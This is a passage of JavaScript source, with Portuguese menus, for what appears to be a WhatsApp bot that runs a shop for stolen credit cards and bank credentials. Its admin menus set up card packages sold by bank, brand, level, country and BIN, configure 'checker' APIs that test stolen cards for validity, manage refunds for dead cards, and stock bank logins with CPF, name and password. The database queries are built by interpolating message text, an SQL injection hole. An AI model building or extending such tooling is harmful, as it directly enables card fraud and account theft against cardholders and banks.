*DELETE TODAS AS CCS DIE DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueccsdie
/deletarestoqueccsdiefull (Full Dados)
┕━━━━╗✹╔━━━━┙`

            CONSTRUCAO_LISTMESSAGE_buttonText = "💳 MAIS OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_title = "💳 MAIS OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_description = Texto

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "💳 AJUSTES - PACOTES CCS",
                    description: "🟢 Configurações sobre API de checker.",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "💳 AJUSTES - CHECKER",
                    description: "🟢 Configurações sobre API de checker.",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "💳 AJUSTES - BINS PERSONALIZADAS",
                    description: "🟢 Mude como quiser as informações das BINS (CLASSIC se torna AMEX se desejar.)",
                },
            )

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💳 AJUSTES - PACOTES CCS") > -1 && Adms.includes(Numero)) {
            NOME_CPF_NA_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'NOME_CPF_NA_MIX'`).get()["VALOR"]
            if (NOME_CPF_NA_MIX === "1") {
                NOME_CPF_NA_MIX_ESTADO = "ATIVADO"
            } else {
                NOME_CPF_NA_MIX_ESTADO = "DESATIVADO"
            }
            Texto = `💳 *PACOTES CCS* 💳

◎ ══════ ❈ ══════ ◎
*NOME E CPF EM PACOTES MIX OU PACOTES DE NIVEL*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOME_CPF_NA_MIX} (${NOME_CPF_NA_MIX_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/mixnomecpf===1

*DESATIVAR*
/mixnomecpf===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OPÇÕES DE COMO VENDER PACOTES DE CC*
◎ ══════ ❈ ══════ ◎

*VENDER PACOTE DE CC MIX*
/venderpacotesmix===1
/venderpacotesmixfull===1
/venderpacotesnivel===1
/venderpacotesnivelfull===1
/venderpacotesbanco===1
/venderpacotesbancofull===1
/venderpacotesbandeira===1
/venderpacotesbandeirafull===1
/venderpacotespais===1
/venderpacotespaisfull===1
/venderpacotesbin===1
/venderpacotesbinfull===1



◎ ══════ ❈ ══════ ◎
*DELETAR LISTA DE OPÇÕES DE PACOTES*
◎ ══════ ❈ ══════ ◎
(Faça sempre isso, toda vez que quiser alterar as opções do pacote.)

*COMANDO*
/deletarpacotemix
/deletarpacotemixfull
/deletarpacotenivel
/deletarpacotenivelfull
/deletarpacotebanco
/deletarpacotebancofull
/deletarpacotebandeira
/deletarpacotebandeirafull
/deletarpacotepais
/deletarpacotepaisfull
/deletarpacotebin
/deletarpacotebinfull
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*INSERIR OPÇÕES DE PACOTE*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/inserirnopacotemix===MIX===10===100
/inserirnopacotemixfull===MIX===10===100
/inserirnopacotenivel===STANDARD===10===100
/inserirnopacotenivelfull===STANDARD===10===100
/inserirnopacotebanco===BRADESCO===10===100
/inserirnopacotebancofull===BRADESCO===10===100
/inserirnopacotebandeira===MASTERCARD===10===100
/inserirnopacotebandeirafull===MASTERCARD===10===100
/inserirnopacotepais===BRASIL===10===100
/inserirnopacotepaisfull===BRASIL===10===100
/inserirnopacotebin===544731===10===100
/inserirnopacotebinfull===544731===10===100

(Nesses exemplos, coloquei 10 CCs de alguns tipos por 100 reais.)
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💳 AJUSTES - CHECKER") > -1 && Adms.includes(Numero)) {

            Texto = `💳 *CHECKER* 💳

pri = Checker Primário
sec = Checker Secundário



◎ ══════ ❈ ══════ ◎
*ATIVAR OU NÃO CHECKER*
◎ ══════ ❈ ══════ ◎

*ATIVA*
/ativarchkpri===1
/ativarchksec===1

*DESATIVA*
/ativarchkpri===0
/ativarchksec===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR URL DA API DE CHK*
◎ ══════ ❈ ══════ ◎

/apichkpri===https://chkapi/cc=infocc
/apichksec===https://chkapi/cc=infocc
(*NÃO ESQUEÇA DE TROCAR A CC PELA PALAVRA* infocc)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*COMO QUER QUE FUNCIONE AS APIs*
*PRIMÁRIA E SECUNDÁRIA*
◎ ══════ ❈ ══════ ◎

*QUEM CHECA NA COMPRA?*
(NENHUMA)
/apichkcompra===0

(APENAS API PRIMÁRIA)
/apichkcompra===1

(APENAS API SECUNDÁRIA)
/apichkcompra===2

(AMBAS, PRIMÁRIA, SE DER DIE SECUNDÁRIA)
/apichkcompra===3
┕━━━━╗✹╔━━━━┙


*QUEM CHECA NAS TROCAS?* (Reembolso)

(APENAS API PRIMÁRIA)
/apichktrocas===1

(APENAS API SECUNDÁRIA)
/apichktrocas===2

(AMBAS)
/apichktrocas===3
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR HEADER AUTHORIZATION API DE CHK*
◎ ══════ ❈ ══════ ◎
(Não precisa usar? Define para 0)

/headauthchkpri===Fulano123456789
/headauthchksec===Fulano123456789
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR 1º PALAVRA AO RETORNAR LIVE DA API*
◎ ══════ ❈ ══════ ◎

/palavralivepri1===Aprovada
/palavralivesec1===Aprovada
┕━━━━╗✹╔━━━━┙

◎ ══════ ❈ ══════ ◎
*DEFINIR 2º PALAVRA AO RETORNAR LIVE DA API*
◎ ══════ ❈ ══════ ◎

/palavralivepri2===Aprovada
/palavralivesec2===Aprovada
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PALAVRA AO RETORNAR DIE DA API*
◎ ══════ ❈ ══════ ◎

/palavradiepri1===Reprovada
/palavradiesec1===Reprovada
┕━━━━╗✹╔━━━━┙

◎ ══════ ❈ ══════ ◎
*DEFINIR PALAVRA AO RETORNAR DIE DA API*
◎ ══════ ❈ ══════ ◎

/palavradiepri2===Reprovada
/palavradiesec2===Reprovada
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ATIVAR REEMBOLSO*
◎ ══════ ❈ ══════ ◎

*ATIVA*
/reembolso===1

*DESATIVA*
/reembolso===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR MINUTO MÍNIMO PARA USAR A FUNÇÃO REEMBOLSO*
◎ ══════ ❈ ══════ ◎
(Depois que comprou a CC, esperar X minutos para poder pedir reembolso)

*EXEMPLO DO COMANDO*
/reembolsotempominimo===5
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR MINUTO LIMITE REEMBOLSO*
◎ ══════ ❈ ══════ ◎
(Depois que comprou a CC, tem até X minutos para pedir reembolso.)
*EXEMPLO DO COMANDO*
/reembolsolimite===10
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💳 AJUSTES - BINS PERSONALIZADAS") > -1 && Adms.includes(Numero)) {

            Texto = `💳 *BINS PERSONALIZADAS* 💳

◎ ══════ ❈ ══════ ◎
*VER TABELAS DE CCs REGISTRADAS*
◎ ══════ ❈ ══════ ◎

*COMANDOS*
/vertabelabandeira
/vertabelabandeirafull
/vertabelanivel
/vertabelanivelfull
/vertabelabanco
/vertabelabancofull
/vertabelapais
/vertabelapaisfull
/vertabelabin
/vertabelabinfull



◎ ══════ ❈ ══════ ◎
*VER LISTA DAS BINS PERSONALIZADAS POR VOCÊ*
◎ ══════ ❈ ══════ ◎

/listarbinspersonalizadas
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR LISTAS DE BINS PERSONALIZADAS*
◎ ══════ ❈ ══════ ◎

/delbinspersonalizadas
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR INFORMAÇÕES DE UMA BIN*
◎ ══════ ❈ ══════ ◎
(Digamos algumas BINs ficam com nomes errados no banco,bandeira,nivel e país, você pode trocar os nomes com esse comando.)

/nomebinbandeira===[BIN]===[NOME]
/nomebinbanco===[BIN]===[NOME]
/nomebinnivel===[BIN]===[NOME]
/nomebinpaís===[BIN]===[NOME]

*Exemplos:*
/nomebinnivel===550209===PLATINUM
(Toda vez que entrar a bin 550209, o Bot vai abastecer como nivel *PLATINUM*)

/nomebandeira===410863===ELO
(Toda vez que entrar a bin 550209, o Bot vai abastecer como bandeira *ELO*)
┕━━━━╗✹╔━━━━┙


⚠️⚠️⚠️⚠️⚠️⚠️⚠️
⚠️ *ATENÇÃO!* ⚠️
⚠️⚠️⚠️⚠️⚠️⚠️⚠️
*Os comandos a seguir, só os utilize se souber usar.*



◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DE UMA BANDEIRA*
◎ ══════ ❈ ══════ ◎

/personalizarbandeira===[CONTÉM ESTE NOME]===[NOVO NOME]

*Exemplos:*
/personalizarbandeira===AMERICAN===AMEX
(Toda vez que entrar uma bandeira *AMERICAN EXPRESS* o Bot vai abastecer como bandeira *AMEX*)

/personalizarbandeira===MASTERCARD===MASTERPORRA
(Toda vez que entrar uma bandeira *MASTERCARD* o Bot vai abastecer como bandeira *MASTERPORRA*)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DE UM NIVEL*
◎ ══════ ❈ ══════ ◎

/personalizarnivel===[CONTÉM ESTE NOME]===[NOVO NOME]

*Exemplo:*
/personalizarnivel===MULTIPLO===ELO
(Toda vez que entrar um nivel *MULTIPLO* o Bot vai abastecer como nivel *ELO*)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DE UM BANCO*
◎ ══════ ❈ ══════ ◎

/personalizarbanco===[CONTÉM ESTE NOME]===[NOVO NOME]

*Exemplo:*
/personalizarbanco===NUBANK===NU Pagamentos
(Toda vez que entrar um banco *NUBANK* o Bot vai abastecer como banco *NU Pagamentos*)
┕━━━━╗✹╔━━━━┙




◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DE UM PAÍS*
◎ ══════ ❈ ══════ ◎

/personalizarpais===[CONTÉM ESTE NOME]===[NOVO NOME]

*Exemplo:*
/personalizarpais===BR===BRASIL
(Toda vez que entrar um país *BR* o Bot vai abastecer como país *BRASIL*)
┕━━━━╗✹╔━━━━┙



⭐ *BÔNUS* ⭐
◎ ══════ ❈ ══════ ◎
*ALTERAR NOME NIVEL SE VIER BANDEIRA TAL*
◎ ══════ ❈ ══════ ◎

/persobandeiranivel===[BANDEIRA CONTÉM ESTE NOME]===[NOVO NOME NIVEL]

*Exemplo:*
/persobandeiranivel===HIPERCARD===HIPERCARD
(Toda vez que entrar uma bandeira *HIPERCARD* o Bot vai abastecer o nivel dela como *HIPERCARD* mesmo que seja uma Platinum ou outro.)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR LISTAS DE BINS PERSONALIZADAS POR PARÂMETROS*
◎ ══════ ❈ ══════ ◎

/delpersobandeira
/delpersonivel
/delpersobanco
/delpersopais

⭐ *BÔNUS* ⭐
/delpersobanivel`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("🏦 AJUSTES - CONSULTÁVEIS") > -1 || Mensagem_Texto.toString() === "/admctavel" && Adms.includes(Numero)) {

            Texto = `🏦 *CONSULTÁVEIS* 🏦


◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO MENU CONSULTÁVEIS*
◎ ══════ ❈ ══════ ◎

/textomenuconsultavel===BEM VINDO AO MENU DE CONSULTÁVEIS!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR CONSULTÁVEIS*
◎ ══════ ❈ ══════ ◎

/textocomprouconsultavel===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ABASTECER CONSULTÁVEIS*
◎ ══════ ❈ ══════ ◎

/addconsul===BANCO===SALDO===PREÇO===INFORMACOES_ADICIONAIS

Exemplo:
/addconsul===RENNER===1500===200===BANCO TAL E
CPF TAL
NOME TAL
SENHA BLABLA

E ETC... E TAL
SALDO DISPONIVEL BLA BLA

┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR PREÇO CONSULTÁVEL DO ESTOQUE POR ID*
◎ ══════ ❈ ══════ ◎

/valorconsultavel===ID===VALOR

Exemplo:
/valorconsultavel===106===95
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODOS AS CONSULTÁVEIS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueconsultavel
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CONSULTÁVEIS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueconsultavel
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("📑 AJUSTES - Consultadas") > -1 || Mensagem_Texto.toString() === "/admctada" && Adms.includes(Numero)) {

            Texto = `📑 *CONSULTADAS* 📑


◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO MENU CONSULTADAS*
◎ ══════ ❈ ══════ ◎

/textomenuconsultada===BEM VINDO AO MENU DE CONSULTÁVEIS!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR CONSULTADAS*
◎ ══════ ❈ ══════ ◎

/textocomprouconsultada===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ABASTECER CONSULTADAS*
◎ ══════ ❈ ══════ ◎

/addconsultada===BANCO===BIN===SALDO===PREÇO===INFORMACOES_ADICIONAIS

Exemplo:
/addconsultada===RENNER===123456===1500===200===BANCO TAL E
CPF TAL
NOME TAL
SENHA BLABLA

E ETC... E TAL
SALDO DISPONIVEL BLA BLA

┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR PREÇO CONSULTADA DO ESTOQUE POR ID*
◎ ══════ ❈ ══════ ◎

/valorconsultada===ID===VALOR

Exemplo:
/valorconsultada===106===95
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODOS AS CONSULTADAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueconsultada
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CONSULTADAS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueconsultada
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
